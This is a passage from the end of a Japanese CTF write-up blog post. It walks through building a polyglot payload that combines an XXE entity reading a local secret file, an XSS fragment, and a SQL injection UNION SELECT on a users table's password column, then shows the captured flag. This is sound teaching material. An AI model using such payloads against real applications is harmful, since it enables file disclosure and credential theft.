+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE hoge [&lt;!ENTITY h SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;&lt;!ENTITY xss &#34;&gt;</span>&#34;&gt;]&gt;<span style="color:#f92672">&lt;r&gt;</span>&amp;h;<span style="color:#f92672">&lt;/r&gt;</span>
+</code></pre></div><p>あとは先ほどのXSSのペイロードと組み合わせれば良いです。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE hoge [&lt;!ENTITY h SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;&lt;!ENTITY xss &#34;&gt;</span>var xss = 1//&#34;&gt;]&gt;<span style="color:#f92672">&lt;r&gt;</span>&amp;h;<span style="color:#f92672">&lt;/r&gt;</span>
+</code></pre></div><p>最後にSQLiのペイロードをくっつけましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE hoge [&lt;!ENTITY h SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;&lt;!ENTITY xss &#34;&gt;</span>var xss = 1//&#34;&gt;]&gt;<span style="color:#f92672">&lt;r&gt;</span>&amp;h;<span style="color:#f92672">&lt;/r&gt;</span><span style="color:#75715e">&lt;!--&#39; UNION SELECT password FROM users;# --&gt;</span>
+</code></pre></div><p>SQLiのペイロードをXML形式でコメントアウトすればOKです。</p>
+<p>その場合，SQLのコメントアウトに<code>--</code>が使えないので，代わりに<code>#</code>を使いました。</p>
+<p>後はカラム数を合わせるために，<code>null</code>などをつけて調整します。</p>
+<p>最終的に，以下のようなペイロードが完成しました。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE hoge [&lt;!ENTITY h SYSTEM &#34;file:///home/gnx/script/xxe_secret&#34;&gt;&lt;!ENTITY xss &#34;&gt;</span>var xss = 1//&#34;&gt;]&gt;<span style="color:#f92672">&lt;r&gt;</span>&amp;h;<span style="color:#f92672">&lt;/r&gt;</span><span style="color:#75715e">&lt;!--&#39; UNION SELECT password,null,null FROM users;# --&gt;</span>
+</code></pre></div><p>このペイロードを入力すると，フラグが得られました！！！</p>
+<p><code>CTF-BR{p4yl04d_p0lygl0ts_4r3_m0r3_fun_th4n_f1l3typ3s}</code></p>
+
+			</div>
+		</div>
+	</div>
+		<div class="links">
+			<a href="https://kuzushiki.github.io/">Home</a>
+			
+				<a href="https://kuzushiki.github.io/post/">Archive</a>
+			
+			
+				
+			
+				
+					<a href="https://kuzushiki.github.io/pages/resume/">Résumé</a>
+				
+			
+			<a href="#top">Top</a>
+		</div>
+		
+		
+		<p id="copyright">
+			© Copyright 2020 kuzushiki
+		</p>
+		
+	</body>
+</html>
+
